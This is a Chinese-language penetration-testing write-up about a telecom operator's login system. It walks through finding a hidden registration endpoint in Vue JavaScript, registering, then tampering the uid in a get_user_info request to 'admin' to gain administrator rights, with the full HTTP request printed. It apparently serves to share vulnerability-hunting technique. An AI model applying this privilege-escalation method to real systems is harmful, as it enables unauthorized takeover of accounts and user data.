某运营商逻辑漏洞思路分享

登录界面其实有很多种思路 很多时候只需要再细心一下即可。  
漏洞url：xxx.xxx..xx  
![1686669581_6488890d8ac15495d6e02.png!small](https://image.3001.net/images/20230613/1686669581_6488890d8ac15495d6e02.png!small)尝试一下弱口令  
![1686669591_64888917a8975104a3783.png!small](https://image.3001.net/images/20230613/1686669591_64888917a8975104a3783.png!small)无果，发现网站有vue框架，检查一下js  
![1686669602_6488892292e8fef5e38b7.png!small](https://image.3001.net/images/20230613/1686669602_6488892292e8fef5e38b7.png!small)  
皇天不负有心人，在/app.bf2b1749.js里面找到了一个可疑接口，尝试拼接访问  
![1686669614_6488892e0a7ac16507be8.png!small](https://image.3001.net/images/20230613/1686669614_6488892e0a7ac16507be8.png!small)发现是注册功能，填写信息进行注册。发现能收到验证码，填写并且注册。  
![1686669625_648889395c24451f07cdf.png!small](https://image.3001.net/images/20230613/1686669625_648889395c24451f07cdf.png!small)  
注册成功  
![1686669637_6488894597c9810a5d527.png!small](https://image.3001.net/images/20230613/1686669637_6488894597c9810a5d527.png!small)尝试登录成功进入后台  
![1686669651_6488895369d67a7449ede.png!small](https://image.3001.net/images/20230613/1686669651_6488895369d67a7449ede.png!small)此处功能没什么用处，打开右上角个人信息的时候，点击刷新，抓包发现一个可疑请求（换火狐抓包）  
![1686669663_6488895f977c0676a44d7.png!small](https://image.3001.net/images/20230613/1686669663_6488895f977c0676a44d7.png!small)抓包
/prod-api/wuyu/user/get_user_info 发现请求刷新，并且出现了uid

![1686669711_6488898fd940f5b2a0952.png!small](https://image.3001.net/images/20230613/1686669711_6488898fd940f5b2a0952.png!small)  
发到repeater里面，修改uid为admin，发现返回系统管理员， 此处可以通过修改uid 达到用户遍历的效果。  
http请求包如下：

> POST /prod-api/wuyu/user/get_user_info HTTP/1.1  
> Host: x  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0)
> Gecko/20100101 Firefox/95.0  
> Accept: application/json, text/plain, *****/*****  
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
> Accept-Encoding: gzip, deflate  
> Content-Type: application/json;charset=utf-8  
> Access_token: hN0AF2XX6**+**qZSAmuoOfwQHh76g8vgqovXx8b065nHsw=  
> Authtoken: a6d71d0278894b9aafd5b45675879a2f  
> Content-Length: 15  
> Origin: [https://x](https://4xxxx8010)  
> Referer: [https:/x/profile/index](https://xxxxx/profile/index)  
> Sec-Fetch-Dest: empty  
> Sec-Fetch-Mode: cors  
> Sec-Fetch-Site: same-origin  
> Cache-Control: max-age=0  
> Te: trailers  
> Connection: close  
> {"uid":"admin"}

![1686669839_64888a0fce697fb8da8e1.png!small](https://image.3001.net/images/20230613/1686669839_64888a0fce697fb8da8e1.png!small)  
此时将抓包的数据改为admin，放包。  
![1686669853_64888a1df163a01097851.png!small](https://image.3001.net/images/20230613/1686669853_64888a1df163a01097851.png!small)此时发现左边选项多了几个操作，垂直越权成功，成功有了管理员权限。  
![1686669862_64888a26190a2c8d8a2df.png!small](https://image.3001.net/images/20230613/1686669862_64888a26190a2c8d8a2df.png!small)  
点击用户管理，可以查看和管理已注册的用户  
![1686669869_64888a2d00255126bef07.png!small](https://image.3001.net/images/20230613/1686669869_64888a2d00255126bef07.png!small)  
还可以进行一系列敏感操作，比如添加有操作权限的用户，等等。  
![1686669875_64888a33d8d274ea4d83c.png!small](https://image.3001.net/images/20230613/1686669875_64888a33d8d274ea4d83c.png!small)  
发现版本管理处有一个apk下载文件，下载后在手机打开  
下载地址：  
http://xx.xx.xx.xx/wuyu/user/release/6/1.0.99/xcgj-1.0.99.apk  
后续就不展示了

